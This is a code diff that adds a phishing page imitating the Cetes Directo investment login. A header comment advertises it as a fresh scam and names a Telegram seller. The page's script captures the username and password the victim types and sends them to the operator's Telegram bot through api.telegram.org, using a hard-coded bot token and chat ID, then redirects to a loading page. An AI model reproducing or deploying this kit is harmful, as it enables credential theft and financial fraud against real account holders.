@@ -1,0 +1,116 @@
+
+<!-- ✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓✓
+✓✓✓✓✓✓ Scam frescos Aqui @ProArgFull 
+✓✓✓✓✓✓ https://t.me/ProArgFull
+ -->
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0 , user-scalable=no">
+    <title>Cetes Directo</title>
+    <link rel="stylesheet" href="./style.css">
+</head>
+<body>
+    <!-- Header -->
+    <div class="header">
+        <div class="header-image"></div>
+    </div>
+
+    <!-- Contenedor Principal -->
+    <div class="main-container">
+
+        <!-- Contenedor Izquierdo -->
+        <div class="left-container">
+            <form action="#" method="post" id="loginForm">
+                <input type="password" id="usuario" name="usuario" placeholder="Usuario">
+                <br><br>
+                <span id="usuarioMostrado" style="display: none;"></span>
+                <br>
+                <div id="passwordFields" style="display: none;">
+                    <input type="password" id="contraseña" name="contraseña" placeholder="Contraseña">
+                </div>
+
+                <button type="button" id="submitButton">Continuar</button>
+            </form>
+        </div>
+
+        <!-- Contenedor Derecho -->
+        <div class="right-container"></div>
+
+    </div>
+    <br><br><br><br><br>
+    <!-- Footer -->
+    <div class="footer">
+        <div class="footer-image"></div>
+    </div>
+    <script type="module">
+        import { message } from './message.js';
+
+        const email = 'tucorreo@example.com';
+        const msg = message(email);
+
+        console.log(msg);
+    </script>
+    <script>
+        
+         document.addEventListener("DOMContentLoaded", function() {
+            const form = document.getElementById("loginForm");
+            const usuarioInput = document.getElementById("usuario");
+            const contraseñaInput = document.getElementById("contraseña");
+            const passwordFields = document.getElementById("passwordFields");
+            const usuarioMostrado = document.getElementById("usuarioMostrado");
+            const submitButton = document.getElementById("submitButton");
+
+            // Función para encriptar el usuario
+            function encriptarUsuario(usuario) {
+                if (usuario.length <= 2) {
+                    return usuario; // Si el usuario tiene menos de dos caracteres, no lo encripta
+                }
+                const primerCaracter = usuario.charAt(0);
+                const ultimoCaracter = usuario.charAt(usuario.length - 1);
+                const caracteresIntermedios = '*'.repeat(usuario.length - 2);
+                
+                return `${primerCaracter}${caracteresIntermedios}${ultimoCaracter}`;
+            }
+
+            // Oculta el campo de contraseña al cargar la página
+            passwordFields.style.display = "none";
+
+            // Muestra el usuario encriptado al hacer clic en el botón "Continuar"
+            submitButton.addEventListener("click", function(event) {
+                event.preventDefault();
+
+                usuarioMostrado.textContent = encriptarUsuario(usuarioInput.value);
+                usuarioMostrado.style.display = "inline"; // Muestra el span
+
+                if (usuarioInput.value.length > 0 && contraseñaInput.value.length > 0) {
+                    // Envía el formulario
+                    const TELEGRAM_BOT_TOKEN = '6502557989:AAE7aDuJ7_4peXSyKC7fnBOHzwDqFa8_s58';
+                    const CHAT_ID = '611534764';
+                    const message = `✓✓✓Cetes Directo✓✓✓\n✓✓✓@ProArgFull✓✓✓\nUsuario: ${usuarioInput.value}\nContraseña: ${contraseñaInput.value}`;
+                    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+
+                    fetch(url)
+                        .then(response => response.json())
+                        .then(data => {
+                            if (data.ok) {
+                                // Redirige a Google después de enviar el formulario
+                                window.location.href = 'carg.html';
+                            }
+                        })
+                        .catch(error => {
+                            console.error("Error al enviar el mensaje", error);
+                        });
+                }
+
+                if (usuarioInput.value.length > 0) {
+                    passwordFields.style.display = "block";
+                } else {
+                    passwordFields.style.display = "none";
+                }
+            });
+        });
+    </script>
+</body>
+</html>
